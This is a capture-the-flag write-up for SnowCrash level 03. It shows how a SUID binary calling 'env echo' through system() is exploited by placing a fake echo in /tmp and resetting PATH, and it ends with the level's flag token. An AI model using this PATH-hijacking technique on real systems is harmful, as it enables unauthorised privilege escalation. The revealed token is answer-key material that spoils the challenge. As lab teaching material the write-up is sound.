## Level 03

When we are logged as level03, we can see level03 file in our home directory.

```bash
level03@SnowCrash:~$ ls -l
total 12
-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
```

After looking in the right assigned in this file, we see r-s, the s permission means SUID, the file is executed with the user owner's permission, and the owner is flag03.

When we run it, we have the following message
```bash
level03@SnowCrash:~$ ./level03
Exploit me
```

At this level, we will use ltrace this tool records and print the dynamic library calls.

```bash
level03@SnowCrash:~$ ltrace ./level03
__libc_start_main(0x80484a4, 1, 0xbffff7f4, 0x8048510, 0x8048580 <unfinished ...>
getegid()                                                                      = 2003
geteuid()                                                                      = 2003
setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                            = 0
setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                            = 0
system("/usr/bin/env echo Exploit me"Exploit me
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                         = 0
+++ exited (status 0) +++
```

As we can see, there is a system call with /usr/bin/env of the echo file. We only have to modify our PATH env to run an echo program. We will run /bin/getflag to get the flag of the next level.

So we will execute the following commands:
```bash
level03@SnowCrash:~$ echo "/bin/getflag" > /tmp/echo
level03@SnowCrash:~$ chmod 755 /tmp/echo
level03@SnowCrash:~$ export PATH=/tmp/
level03@SnowCrash:~$ ./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```


